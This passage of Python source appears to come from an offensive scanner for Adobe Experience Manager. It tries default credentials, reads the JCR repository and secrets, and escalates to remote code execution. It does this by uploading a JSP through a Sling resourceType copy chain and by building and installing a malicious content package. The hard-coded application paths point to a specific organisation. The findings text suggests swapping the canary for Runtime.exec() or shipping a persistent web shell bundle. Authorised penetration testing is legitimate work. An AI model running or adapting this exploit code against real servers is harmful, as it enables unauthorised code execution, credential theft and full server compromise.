                evidence="; ".join(fp["indicators"][:6]),
                description=f"Server identified as Adobe Experience Manager. Instance type: {fp['instance']}.",
            ))
        else:
            self.logger.warn("No clear AEM fingerprint — running anyway, results may be noisy.")
        return fp

    # =======================================================================
    # 2. Default credentials probe
    # =======================================================================
    def check_default_credentials(self) -> None:
        if not self._enabled("creds"):
            return
        self.logger.section("Default credential probe")

        # Establish which probe path actually requires auth on this target
        auth_path = None
        for p in AUTH_PROBE_PATHS:
            r = self.client.get(p)
            if r is not None and r.status_code in (401, 403):
                auth_path = p
                self.logger.info(f"Using {p} as basic-auth probe (baseline {r.status_code})")
                break
        if auth_path is None:
            self.logger.warn("No basic-auth-gated path found; skipping credential probe.")
            return

        for user, password in DEFAULT_CREDENTIALS:
            token = base64.b64encode(f"{user}:{password}".encode()).decode()
            r = self.client.get(auth_path, headers={"Authorization": f"Basic {token}"})
            if r is None:
                continue
            if r.status_code == 200:
                self.reporter.add(Finding(
                    title=f"Default credentials accepted: {user}:{password}",
                    severity=SEV_CRITICAL,
                    category=CAT_AUTH,
                    target=self.target + auth_path,
                    evidence=f"HTTP 200 on {auth_path} with Basic Auth user={user!r}",
                    description=("AEM accepted a well-known default credential. "
                                 "Authenticate against /crx/de or /system/console and "
                                 "expect direct path to OS-level RCE via Felix bundle upload, "
                                 "Groovy console, or CRX package install."),
                    references=[
                        "https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem",
                        "https://github.com/0ang3el/aem-hacker",
                    ],
                    request=f"GET {auth_path} HTTP/1.1\nAuthorization: Basic {token}\n",
                    response_snippet=f"HTTP {r.status_code} | {len(r.content)} bytes",
                ))

    # =======================================================================
    # 3. Exposed DATA-endpoint probe (consoles handled by check_consoles)
    # =======================================================================
    def check_exposed_endpoints(self) -> None:
        if not self._enabled("exposure"):
            return
        self.logger.section("Exposed data-endpoint probe")

        def probe(entry):
            path, sev, cat, label, sig = entry
            r = self.client.get(path)
            if r is None or r.status_code != 200:
                return
            # The big one: suppress login pages / auth redirects masquerading as 200.
            if self._is_authwall(r):
                self.logger.debug(f"{path}: login/auth wall -> suppressed")
                return
            body = safe_response_text(r, 8000)
            # JSON endpoints must actually return JSON (not an HTML shell).
            bare = path.split("?", 1)[0]
            if bare.endswith(".json"):
                s = body.lstrip()
                if not (s.startswith("{") or s.startswith("[")):
                    return
                if s in ("{}", "[]"):
                    return  # empty == no access / nothing to see
            if sig and not re.search(sig, body, re.I):
                # 200 but not the expected content signature — soft 404 / wrong page.
                return
            eff = sev
            extra = ""
            if RE_SECRET.search(body):
                eff = SEV_CRITICAL
                extra = " — response contains secret-like values"
            self.reporter.add(Finding(
                title=label + extra,
                severity=eff, category=cat, target=self.target + path,
                evidence=f"HTTP 200, {len(r.content)} bytes, readable {self._who()} (not a login page)",
                description=(f"{path} returned real content {self._who()}. "
                             "Verified it is not a login/auth-wall response."),
                request=self.client.request_signature("GET", path),
                response_snippet=snippet(body, 600),
            ))

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe, SENSITIVE_ENDPOINTS))

    # =======================================================================
    # 3b. Privileged console access — verified FUNCTIONALLY, not by shell HTML.
    # =======================================================================
    def check_consoles(self) -> None:
        if not self._enabled("exposure"):
            return
        self.logger.section("Privileged console access verification")

        felix_ok = self._verify_felix()
        pkg_ok = self._verify_packmgr()
        repo_ok = self._verify_repo_read()

        # Shells that merely render (200, not a login page) but where no
        # privileged operation succeeded -> single INFO each, so you know to
        # retry with role cookies. No more false CRITICALs.
        gated = [
            ("/system/console", "Felix OSGi console", felix_ok),
            ("/crx/de/index.jsp", "CRXDE Lite", repo_ok),
            ("/crx/packmgr/index.jsp", "CRX Package Manager", pkg_ok),
            ("/crx/explorer/index.jsp", "CRX Explorer", repo_ok),
            ("/bin/groovyconsole.html", "Groovy Console", False),  # RCE proof is in check_groovy_console
        ]
        for path, name, proven in gated:
            if proven:
                continue
            r = self.client.get(path)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                continue
            self.reporter.add(Finding(
                title=f"{name} shell loads but no privileged access {self._who()}",
                severity=SEV_INFO, category=CAT_EXPOSURE, target=self.target + path,
                evidence="Console HTML shell returned; backend operations were NOT confirmed accessible.",
                description=("This is the AEM console SHELL, which renders for anyone — it is "
                             "NOT proof of access. No privileged operation succeeded here. "
                             "Re-test with authenticated role cookies; a low-privilege session "
                             "that can actually drive this console would be the real finding."),
            ))

    def _verify_felix(self) -> bool:
        """Functional proof: bundles.json returns the live OSGi inventory."""
        r = self.client.get("/system/console/bundles.json")
        if r is None or r.status_code != 200 or self._is_authwall(r):
            return False
        b = r.text or ""
        if ('"data"' in b or '"s"' in b) and ("symbolicName" in b or "stateRaw" in b or "fragment" in b):
            self.reporter.add(Finding(
                title=f"Felix OSGi console accessible {self._role_tag()} — RCE via bundle install",
                severity=SEV_CRITICAL, category=CAT_RCE,
                target=self.target + "/system/console/bundles.json",
                evidence="bundles.json returned the live OSGi bundle inventory (functional access, not a shell).",
                description=("The Felix OSGi web console is functionally reachable. Installing a "
                             "malicious OSGi bundle via /system/console/bundles yields OS-level "
                             "RCE as the AEM service user."),
                references=["https://github.com/0ang3el/aem-rce-bundle"],
                request=self.client.request_signature("GET", "/system/console/bundles.json"),
                response_snippet=snippet(b, 500),
            ))
            return True
        return False

    def _verify_packmgr(self) -> bool:
        """Functional proof: package service returns an actual package listing."""
        for p in ("/crx/packmgr/service.jsp?cmd=ls",
                  "/crx/packmgr/list.jsp?_charset_=utf-8",
                  "/crx/packmgr/service/.json?cmd=ls"):
            r = self.client.get(p)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                continue
            b = r.text or ""
            if any(k in b for k in ("downloadName", "<package>", "buildCount",
                                    '"packages"', '"pages"', "<crx version")):
                self.reporter.add(Finding(
                    title=f"CRX Package Manager accessible {self._role_tag()} — RCE via package install",
                    severity=SEV_CRITICAL, category=CAT_RCE,
                    target=self.target + p,
                    evidence="Package service returned a real package listing (functional access).",
                    description=("Package Manager is functionally reachable. Build/upload a content "
                                 "package containing a malicious OSGi bundle or JSP and install it "
                                 "for code execution."),
                    references=["https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem"],
                    request=self.client.request_signature("GET", p),
                    response_snippet=snippet(b, 500),
                ))
                return True
        return False

    def _verify_repo_read(self) -> bool:
        """Functional proof: a JCR node that should be ACL-protected is readable.

        This is the substance behind 'CRXDE access' — being able to read the
        repository. The CRXDE *shell* alone proves nothing.
        """
        candidates = [
            ("/crx/server/crx.default/jcr:root/.1.json", SEV_HIGH,   "Anonymous JCR read via CRX server"),
            ("/.1.json",                                 SEV_HIGH,   "Repository root readable"),
            ("/var.1.json",                              SEV_MEDIUM, "/var readable"),
        ]
        for path, sev, label in candidates:
            r = self.client.get(path)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                continue
            b = (r.text or "").lstrip()
            if b.startswith("{") and "jcr:primaryType" in b:
                eff = SEV_CRITICAL if RE_SECRET.search(b) else sev
                self.reporter.add(Finding(
                    title=f"{label} {self._role_tag()}",
                    severity=eff, category=CAT_JCR, target=self.target + path,
                    evidence=f"Returned JCR JSON ({len(r.content)} bytes) {self._who()}.",
                    description=("The JCR repository is readable without the expected "
                                 "authorization. Enumerate users, configs and content from "
                                 "here — this is what makes CRXDE access dangerous."),
                    request=self.client.request_signature("GET", path),
                    response_snippet=snippet(r.text, 600),
                ))
                return True
        return False

    # =======================================================================
    # 3c. ACTIVE ESCALATION — turn read/console primitives into proof of impact.
    #     Safe-by-default: create-then-delete throwaway artifacts to CONFIRM the
    #     capability is real (not just intended read-only). The destructive
    #     end-to-end PoCs (drop+execute a JSP, add self to admins, exfil real
    #     data) only run with --exploit.
    # =======================================================================
    def _csrf_headers(self) -> Dict[str, str]:
        return {"CSRF-Token": self._csrf_token} if self._csrf_token else {}

    def _auth_post(self, path: str, **kw):
        headers = kw.pop("headers", {}) or {}
        if self._csrf_token:
            headers.setdefault("CSRF-Token", self._csrf_token)
        return self.client.post(path, headers=headers, **kw)

    @staticmethod
    def _pkg_success(resp) -> bool:
        if resp is None or resp.status_code not in (200, 201):
            return False
        t = resp.text or ""
        try:
            d = json.loads(t)
            if isinstance(d, dict) and d.get("success") is True:
                return True
        except Exception:
            pass
        return '"success":true' in t.replace(" ", "").lower()

    def check_escalation(self) -> None:
        if not self._enabled("escalation"):
            return
        self.logger.section(f"Active escalation {self._role_tag()}"
                            + ("  [--exploit ON]" if self.exploit else ""))
        self.fetch_csrf_token()
        confirmed = 0
        confirmed += int(self._escalate_packmgr())
        confirmed += int(self._escalate_crx_dav())
        confirmed += int(self._escalate_sling_write())
        self._harvest_secrets()
        # Turn the confirmed READ into concrete, provable impact:
        self._recover_credentials()
        if self.exploit:
            self._sling_resourcetype_rce()
        elif confirmed:
            self.logger.warn("Write/install capability CONFIRMED unauthenticated. Re-run with "
                             "--exploit to prove end-to-end RCE (drops & removes a canary JSP).")

    def _sling_resourcetype_rce(self) -> bool:
        """RCE via the Sling resourceType chain (Mikhail Egorov / Static-Flow):
        write a JSP to /content -> :operation=copy it to /apps -> bind
        sling:resourceType -> request the node so Sling executes the JSP. Works
        when /content is writable and copy reaches /apps even if a direct /apps
        POST-create is blocked."""
        marker = "".join(random.choices(string.ascii_uppercase, k=6))
        exec_token = "AEMHUNTERRCE" + marker  # only present if the JSP RUNS
        jsp = '<%= "AEMHUN" + "TERRCE" + "' + marker + '" + "-" + System.getProperty("user.name") %>'
        rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        cfolder = f"/content/aemhunter{rnd}"
        afolder = f"/apps/aemhunter{rnd}"
        rcenode = f"/content/aemhunterrce{rnd}"
        rtype = f"aemhunter{rnd}"
        self.logger.info("resourceType RCE: /content upload -> copy to /apps -> bind type -> exec...")
        try:
            self._auth_post(cfolder, data={"jcr:primaryType": "nt:folder"})
            self._auth_post(cfolder, files={"exec.jsp": ("exec.jsp", jsp, "application/octet-stream")})
            self._auth_post(cfolder, data={":operation": "copy", ":dest": afolder})
            self._auth_post(rcenode, data={"sling:resourceType": rtype})
            ex = self.client.get(rcenode + ".exec")
            executed = ex is not None and exec_token in (ex.text or "")
            if executed:
                self.reporter.add(Finding(
                    title=f"REMOTE CODE EXECUTION via Sling resourceType chain {self._role_tag()}",
                    severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + rcenode + ".exec",
                    evidence=f"Executed a JSP via the /content->/apps copy + resourceType chain: "
                             f"{snippet(ex.text, 160)}",
                    description=("END-TO-END RCE (Egorov technique, github.com/Static-Flow/aem-rce): "
                                 "uploaded a JSP to /content, copied it to /apps via :operation=copy, "
                                 "bound sling:resourceType, and the server executed it on request. "
                                 "This works even when a direct /apps POST-create is blocked, as long "
                                 "as /content is writable and the copy reaches /apps."),
                    references=["https://github.com/Static-Flow/aem-rce",
                                "https://www.slideshare.net/0ang3el/hacking-aem-sites"],
                    request=(f"POST {cfolder} (jcr:primaryType=nt:folder) | "
                             f"POST {cfolder} (exec.jsp=<JSP>) | "
                             f"POST {cfolder} (:operation=copy&:dest={afolder}) | "
                             f"POST {rcenode} (sling:resourceType={rtype}) | GET {rcenode}.exec"),
                    response_snippet=snippet(ex.text, 300)))
                return True
            return False
        finally:
            for node in (rcenode, cfolder, afolder):
                self._auth_post(node, data={":operation": "delete"})

    def _emit_access_summary(self) -> None:
        """Synthesize what THIS anonymous scan actually proved — single,
        report-ready line so the unauthenticated impact is unambiguous."""
        mine = list(self.reporter.findings)
        if not mine:
            return
        T = " || ".join(f.title for f in mine)
        rce = "REMOTE CODE EXECUTION" in T or "RCE confirmed" in T
        write_code = ("WRITE to CODE" in T) or ("Sling JSP" in T) or ("DavEx WRITE" in T)
        read_repo = ("JCR read" in T) or ("Repository root readable" in T) or ("DavEx full-repo READ" in T)
        packmgr = "Package Manager" in T
        lateral = "Replication transport credentials" in T
        hashes = "HASHES dumped" in T
        users = "User enumeration" in T
        secrets = [f for f in mine if "Secret value readable" in f.title or "secret-like values" in f.title]
        ssrf = "SSRF" in T
        xss = " XSS " in (" " + T + " ") or "reflected XSS" in T
        cves = sorted({f.cve for f in mine if f.cve})

        caps: List[str] = []
        if read_repo:
            caps.append("full-repo READ (CRX DavEx)")
        if packmgr:
            caps.append("packmgr listing READ")
        if secrets:
            caps.append(f"{len(secrets)} secret(s) incl. config creds")
        if lateral:
            caps.append("replication creds -> lateral to PUBLISH")
        if hashes:
            caps.append("user password HASHES")
        elif users:
            caps.append("user enumeration")
        if ssrf:
            caps.append("SSRF")
        if xss:
            caps.append("reflected XSS")
        if cves:
            caps.append("CVEs: " + ", ".join(cves[:6]))
        if rce:
            caps.append("RCE CONFIRMED")
        elif write_code:
            caps.append("code-space WRITE (RCE-capable)")
        elif not caps:
            caps.append("no unauthenticated impact confirmed")

        if rce or write_code:
            sev = SEV_CRITICAL
            verdict = "the target reaches unauthenticated code execution"
        elif lateral or hashes:
            sev = SEV_CRITICAL
            verdict = "credentials for lateral movement / account takeover are exposed unauthenticated"
        elif read_repo or packmgr or secrets:
            sev = SEV_HIGH
            verdict = "broken access control + sensitive data exposure unauthenticated"
        elif ssrf or xss or cves:
            sev = SEV_HIGH
            verdict = "exploitable web vulns reachable unauthenticated"
        else:
            sev = SEV_INFO
            verdict = "no critical unauthenticated impact confirmed"

        self.reporter.add(Finding(
            title=f"ACCESS SUMMARY (anonymous): " + "; ".join(caps),
            severity=sev, category=CAT_ROLE, target=self.target,
            evidence="; ".join(caps),
            description=(f"Verdict: {verdict}. This summary aggregates the per-module "
                         "findings above into one report-ready statement."),
        ))

    # ---- Package Manager: the primary RCE path. Try hard. ----
    def _escalate_packmgr(self) -> bool:
        ls = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
        if not (ls and ls.status_code == 200 and not self._is_authwall(ls) and "<crx" in (ls.text or "")):
            return False
        m = re.search(r'user="([^"]+)"', ls.text or "")
        acting = m.group(1) if m else "?"
        self.logger.info(f"Package Manager reachable (acting user={acting}); probing create/install rights...")

        # Capability probe: can we create an empty package? (signal only)
        rnd = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        grp = "aemhunter"
        pkgpath = f"/etc/packages/{grp}/{rnd}.zip"
        create = self._auth_post(f"/crx/packmgr/service/.json{pkgpath}",
                                 params={"cmd": "create", "packageName": rnd,
                                         "groupName": grp, "_charset_": "utf-8"})
        created = self._pkg_success(create)
        if created:
            self.reporter.add(Finding(
                title=f"Package Manager create rights confirmed {self._role_tag()} — install = RCE",
                severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + pkgpath,
                evidence=f"Created a throwaway package as user={acting} (then deleted it).",
                description=("This session can create packages via CRX Package Manager. Package "
                             "install executes arbitrary code => RCE. A content-editor role should "
                             "never have this."),
                references=["https://github.com/0ang3el/aem-rce-bundle"],
                request=f"POST /crx/packmgr/service/.json{pkgpath}?cmd=create&packageName={rnd}&groupName={grp}",
                response_snippet=safe_response_text(create, 300),
            ))
            self._auth_post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"})
        else:
            self.reporter.add(Finding(
                title=f"Package Manager listing readable {self._role_tag()} (create NOT confirmed)",
                severity=SEV_MEDIUM, category=CAT_EXPOSURE,
                target=self.target + "/crx/packmgr/service.jsp?cmd=ls",
                evidence=f"cmd=ls works as user={acting}; cmd=create returned "
                         f"{getattr(create, 'status_code', 'ERR')} (no success).",
                description=("Can enumerate packages. Empty-package create was rejected, but "
                             "upload+install may still work (different permission) — that is the "
                             "real RCE path and is attempted with --exploit."),
                response_snippet=safe_response_text(ls, 300),
            ))

        # The actual RCE: upload a package + install it. Crucially, this is tried
        # even when cmd=create was denied — upload/install is a separate right,
        # and install often writes /apps via the package-manager service session.
        if self.exploit:
            self._packmgr_rce_poc(acting)
        elif created:
            self.logger.warn("Re-run with --exploit to attempt the package upload+install RCE PoC.")
        return True

    def _packmgr_rce_poc(self, acting: str) -> None:
        marker = "".join(random.choices(string.ascii_uppercase, k=6))
        # exec_token only appears if the JSP RUNS: the source splits the literal
        # ("AEMHUN" + "TERRCE" + ...), so a JSP served as SOURCE never contains the
        # contiguous token — only runtime string concatenation produces it. This
        # prevents a source-served JSP from being mis-reported as executed.
        exec_token = "AEMHUNTERRCE" + marker
        jsp = '<%= "AEMHUN" + "TERRCE" + "' + marker + '" + "-" + System.getProperty("user.name") %>'
        ref = self.client.base_url + "/crx/packmgr/index.jsp"
        headers = {"Referer": ref}
        if self._csrf_token:
            headers["CSRF-Token"] = self._csrf_token

        # The role may be barred from /apps ROOT yet allowed to install into its
        # OWN app (e.g. a CPB Content Package Deployer can write /apps/cpb). Best
        # targets = the code roots that EXISTING packages already deploy to (read
        # from their filters via our repo-read) — those are paths this role is
        # actually allowed to install into. Then fall back to /apps children + guesses.
        code_roots = self._discover_pkg_filter_roots()      # real, allowed deploy targets first
        code_roots += ["/apps"]
        code_roots += self._discover_apps_children()
        code_roots += ["/apps/cpb", "/apps/citi-base", "/apps/citi-cgcpc", "/apps/cgcpc",
                       "/apps/citi-foundation", "/apps/settings", "/libs"]
        seen_roots: Set[str] = set()
        roots: List[str] = []
        for r in code_roots:
            r = r.rstrip("/")
            if r and r not in seen_roots:
                seen_roots.add(r)
                roots.append(r)
        roots = roots[:18]

        self.logger.info(f"upload+install RCE: trying {len(roots)} code path(s) for an "
                         "installable+executable JSP...")
        any_upload = False
        any_install = False
        written_path = None   # a path where the JSP file landed but didn't execute
        last_status = "n/a"
        for root in roots:
            sub = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
            rel = f"{root.lstrip('/')}/{sub}/poc.jsp"          # apps/cpb/aemhunterXXXX/poc.jsp
            folder_repo = f"{root}/{sub}"                       # /apps/cpb/aemhunterXXXX
            jsp_repo = f"{folder_repo}/poc.jsp"
            grp = "aemhunter"
            name = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
            pkgpath = f"/etc/packages/{grp}/{name}.zip"
            zipbytes = self._build_vault_package(grp, name, {rel: jsp})

            # Send BOTH multipart field names ("package" and "file") — different
            # AEM versions expect different ones; the legacy .jsp upload form uses
            # "file". (Dropping "file" makes some instances reject the upload.)
            mp = {"package": (name + ".zip", zipbytes, "application/zip"),
                  "file": (name + ".zip", zipbytes, "application/zip")}
            # upload (install=true one-shot), try legacy .jsp then .json then path-scoped
            up = self.client.post("/crx/packmgr/service.jsp",
                                  data={"cmd": "upload", "name": name, "force": "true", "install": "true"},
                                  files=mp, headers=headers)
            ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
            uploaded = self._pkg_success(up) or (ls2 is not None and name in (ls2.text or ""))
            if not uploaded:
                up = self.client.post("/crx/packmgr/service/.json", params={"cmd": "upload"},
                                      data={"name": name, "force": "true", "install": "true"},
                                      files=mp, headers=headers)
                ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
                uploaded = self._pkg_success(up) or (ls2 is not None and name in (ls2.text or ""))
            if not uploaded:
                up = self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "upload"},
                                      data={"force": "true", "install": "true"}, files=mp, headers=headers)
                ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
                uploaded = self._pkg_success(up) or (ls2 is not None and name in (ls2.text or ""))
            last_status = getattr(up, "status_code", "ERR")
            if uploaded:
                any_upload = True
                inst = self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
                                        params={"cmd": "install"}, headers=headers)
                # legacy install fallback
                self.client.post("/crx/packmgr/service.jsp",
                                 data={"cmd": "inst", "name": name + ".zip", "group": grp},
                                 headers=headers)
                if self._pkg_success(inst):
                    any_install = True

            ex = self.client.get(jsp_repo)
            ex_body = (ex.text if ex is not None else "") or ""
            executed = ex is not None and exec_token in ex_body          # ran (not just source)
            # Did the JSP FILE actually land (even if served as source / not executed)?
            written = (not executed and ex is not None and ex.status_code == 200
                       and ("System.getProperty" in ex_body or "AEMHUN" in ex_body or "<%" in ex_body))
            if written:
                any_install = True
                if written_path is None:
                    written_path = jsp_repo

            # cleanup this attempt no matter what
            self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"}, headers=headers)
            self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"}, headers=headers)
            self._auth_post(folder_repo, data={":operation": "delete"})

            if executed:
                self.reporter.add(Finding(
                    title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
                    severity=SEV_CRITICAL, category=CAT_RCE,
                    target=self.target + jsp_repo,
                    evidence=f"user={acting}: uploaded+installed a content package writing {jsp_repo} "
                             f"and the server executed it: {snippet(ex_body, 160)}",
                    description=(f"END-TO-END RCE: this role uploaded and installed a content package "
                                 f"that wrote a JSP to {root} (a code/script space) and the server "
                                 "executed attacker Java code. Full server compromise as the AEM "
                                 "service user. Swap the canary for Runtime.exec() for OS command "
                                 "execution, or ship an OSGi bundle for a persistent web shell."),
                    references=["https://github.com/0ang3el/aem-rce-bundle",
                                "https://github.com/0ang3el/aem-hacker"],
                    request=f"POST /crx/packmgr/service.jsp (vault pkg writing {jsp_repo}, install=true) "
                            f"then GET {jsp_repo} -> {exec_token}-<svcuser>",
                    response_snippet=snippet(ex_body, 300),
                ))
                return

        # The JSP FILE landed in a script space but didn't auto-execute -> still
        # RCE-equivalent (render it via a sling:resourceType node and it runs).
        if written_path:
            app_root = "/" + "/".join(written_path.strip("/").split("/")[:2])
            self.reporter.add(Finding(
                title=f"Arbitrary code written to {app_root} via package install {self._role_tag()} (RCE-equivalent)",
                severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + written_path,
                evidence=f"user={acting}: a package install wrote a JSP at {written_path} "
                         "(served as source — direct .jsp exec disabled — but the file write into "
                         "the script space is confirmed).",
                description=("This role can write executable scripts into the /apps or /libs script "
                             "space via package install. Direct .jsp execution looks disabled, but "
                             "rendering the script through a sling:resourceType content node "
                             "executes it — effectively RCE. Finish the PoC by installing a "
                             "component (sling:resourceType) plus a /content node that renders it, "
                             "or by shipping an OSGi bundle into <appRoot>/install (the Sling "
                             "JcrInstaller deploys it as a system service)."),
                references=["https://github.com/0ang3el/aem-hacker",
                            "https://github.com/0ang3el/aem-rce-bundle"],
            ))
            return

        # Nothing landed — report precisely where it broke.
        if not any_upload:
            blocked = "UPLOAD denied"
            nxt = ("Package Manager is read-only for THIS role. Try a package-deploy role "
                   "('CPB Content Package Deployer').")
        elif not any_install:
            blocked = "INSTALL denied on every code path tried"
            nxt = (f"This role can create/upload packages to /etc/packages but install (activation) "
                   f"was rejected on all {len(roots)} code paths tried — including the real package "
                   "filter roots. This is an UPLOAD-ONLY deployer: it stages packages but a separate "
                   "gated step (approval/replication/pipeline) installs them. Direct RCE is not "
                   "reachable via this role's install. Leverage: (a) the staged malicious package "
                   "may be installed later by that pipeline (second-order RCE); (b) test a role with "
                   "install rights (e.g. 'Content Reviewer and Publisher'); (c) the OSGi-bundle "
                   "route still needs install. The full-repo READ + secret exposure + arbitrary "
                   "package STAGING here are already critical findings on their own.")
        else:
            blocked = "INSTALL ok but JSP neither executed nor found"
            nxt = ("A package installed (API success) but the JSP was not at the expected path. "
                   "Install may have rewritten/blocked the path. Manual review with -v recommended.")

        self.reporter.add(Finding(
            title=f"Package install RCE NOT achieved {self._role_tag()} — blocked at: {blocked}",
            severity=SEV_HIGH, category=CAT_RCE,
            target=self.target + "/crx/packmgr/service.jsp",
            evidence=f"user={acting} | upload_ok={any_upload} (last status {last_status}) | "
                     f"install_ok={any_install} | jsp_written={bool(written_path)} | "
                     f"tried {len(roots)} code paths",
            description=(f"Package-manager RCE attempt result: {blocked}. Next: {nxt}"),
            references=["https://github.com/0ang3el/aem-rce-bundle"],
        ))

    def _build_vault_package(self, group: str, name: str, files: Dict[str, str]) -> bytes:
        """Build a minimal FileVault content-package zip in memory. Creates an
        nt:folder .content.xml for each file's parent so install lands cleanly
        at any target path (not just /apps/aemhunter)."""
        import io
        import zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            parents = sorted({p.rsplit("/", 1)[0] for p in files})  # e.g. apps/cpb/aemhunterX
            filt = '<?xml version="1.0" encoding="UTF-8"?>\n<workspaceFilter version="1.0">\n'
            for par in parents:
                filt += f'  <filter root="/{par}"/>\n'
            filt += '</workspaceFilter>\n'
            z.writestr("META-INF/vault/filter.xml", filt)
            z.writestr("META-INF/vault/properties.xml",
                       '<?xml version="1.0" encoding="UTF-8"?>\n'
                       '<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">\n'
                       '<properties>\n'
                       f'  <entry key="name">{name}</entry>\n'
                       f'  <entry key="group">{group}</entry>\n'
                       '  <entry key="version">1.0</entry>\n'
                       '</properties>\n')
            for par in parents:
                z.writestr(f"jcr_root/{par}/.content.xml",
                           '<?xml version="1.0" encoding="UTF-8"?>\n'
                           '<jcr:root xmlns:jcr="http://www.jcp.org/jcr/1.0" '
                           'xmlns:nt="http://www.jcp.org/jcr/nt/1.0" '
                           'jcr:primaryType="nt:folder"/>\n')
            for relpath, content in files.items():
                z.writestr("jcr_root/" + relpath, content)
        return buf.getvalue()

    # ---- CRX DavEx: confirm repo WRITE ----
    def _escalate_crx_dav(self) -> bool:
        base = "/crx/server/crx.default/jcr:root"
        read = self.client.get(base + "/.1.json")
        if not (read and read.status_code == 200 and not self._is_authwall(read)
                and "jcr:primaryType" in (read.text or "")):
            return False
        rnd = "aemhunter-" + "".join(random.choices(string.ascii_lowercase, k=8))
        target = f"{base}/tmp/{rnd}"
        mk = self.client.request("MKCOL", target, headers=self._csrf_headers())
        if mk is not None and mk.status_code in (200, 201):
            self.reporter.add(Finding(
                title=f"CRX DavEx WRITE confirmed {self._role_tag()} — arbitrary repo write",
                severity=SEV_CRITICAL, category=CAT_JCR, target=self.target + target,
                evidence=f"MKCOL created {target} (HTTP {mk.status_code}); removed afterwards.",
                description=("CONFIRMED: this session can WRITE to the JCR over the CRX "
                             "WebDAV/DavEx server. Arbitrary repo write => deploy a JSP under "
                             "/apps for RCE, or tamper with ACLs / users / groups."),
                request=f"MKCOL {target}", response_snippet="",
            ))
            self.client.request("DELETE", target, headers=self._csrf_headers())
            return True
        self.reporter.add(Finding(
            title=f"CRX DavEx full-repo READ confirmed {self._role_tag()} (write NOT confirmed)",
            severity=SEV_HIGH, category=CAT_JCR, target=self.target + base + "/.1.json",
            evidence=f"Whole repository tree readable; MKCOL write returned "
                     f"{getattr(mk, 'status_code', 'ERR')}.",
            description=("Can read the entire repository structure over DavEx — use it for "
                         "content/user/config enumeration and to locate secrets."),
            response_snippet=snippet(read.text, 400),
        ))
        return False

    def _sling_can_write(self, base: str, marker: str) -> bool:
        """Create a node, confirm via GET .json, delete it. Returns True if write stuck."""
        r = self._auth_post(base, data={"jcr:primaryType": "nt:unstructured", "aemhunter": marker})
        if r is None or r.status_code not in (200, 201):
            return False
        v = self.client.get(base + ".json")
        ok = bool(v and v.status_code == 200 and marker in (v.text or ""))
        self._auth_post(base, data={":operation": "delete"})  # cleanup
        return ok

    def _discover_apps_children(self) -> List[str]:
        """List existing /apps child app folders (writable subpaths are RCE-capable)."""
        out: List[str] = []
        r = self.client.get("/apps.1.json")
        if r and r.status_code == 200 and not self._is_authwall(r):
            try:
                for k, v in json.loads(r.text).items():
                    if isinstance(v, dict) and not k.startswith(("jcr:", "sling:", "rep:")):
                        out.append("/apps/" + k)
            except Exception:
                pass
        return out[:20]

    def _discover_pkg_filter_roots(self) -> List[str]:
        """Read EXISTING packages' filter roots from the repo. Those are paths the
        deploy role is actually allowed to install into — far better install
        targets than blind /apps guesses. Returns code roots under /apps or /libs."""
        roots: List[str] = []
        seen: Set[str] = set()
        ls = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
        if not (ls and ls.status_code == 200 and not self._is_authwall(ls)):
            return roots
        body = ls.text or ""
        pkgs = re.findall(r"<package>.*?</package>", body, re.S)[:15]
        for pk in pkgs:
            g = re.search(r"<group>([^<]*)</group>", pk)
            dn = re.search(r"<downloadName>([^<]*)</downloadName>", pk)
            nm = re.search(r"<name>([^<]*)</name>", pk)
            if not (dn or nm):
                continue
            grp = (g.group(1) if g else "").strip("/")
            fname = dn.group(1) if dn else (nm.group(1) + ".zip")
            defbase = f"/etc/packages/{grp}/{fname}/jcr:content/vlt:definition/filter".replace("//", "/")
            fr = self.client.get(defbase + ".infinity.json") or self.client.get(defbase + ".3.json")
            if not (fr and fr.status_code == 200 and not self._is_authwall(fr)):
                continue
            for m in re.finditer(r'"root"\s*:\s*"(/(?:apps|libs)/[^"]+)"', fr.text or ""):
                rt = m.group(1)
                segs = rt.strip("/").split("/")
                cand = "/" + "/".join(segs[:3]) if len(segs) >= 3 else rt  # app-level root
                if cand not in seen:
                    seen.add(cand)
                    roots.append(cand)
            if len(roots) >= 8:
                break
        if roots:
            self.logger.info(f"Discovered {len(roots)} real package-filter code root(s) to "
                             f"target for install: {', '.join(roots[:8])}")
        return roots[:8]

    # ---- Sling POST: find a CODE-EXECUTABLE writable path, then prove RCE ----
    def _escalate_sling_write(self) -> bool:
        marker = "aemhunter" + "".join(random.choices(string.ascii_lowercase, k=6))
        # Code-space candidates first: /apps root, then each existing /apps child
        # (a content editor often can't write /apps root but CAN write a specific app).
        code_candidates = ["/apps/aemhunter-" + marker]
        for child in self._discover_apps_children():
            code_candidates.append(f"{child}/aemhunter-{marker}")
        code_candidates.append("/libs/aemhunter-" + marker)

        # Non-code writes: useful signal but not directly RCE.
        # /content + /tmp are routinely writable for authors (their job / scratch)
        # so they are INFO; config trees are higher.
        other = [
            ("/etc/aemhunter-" + marker, SEV_HIGH, "config tamper"),
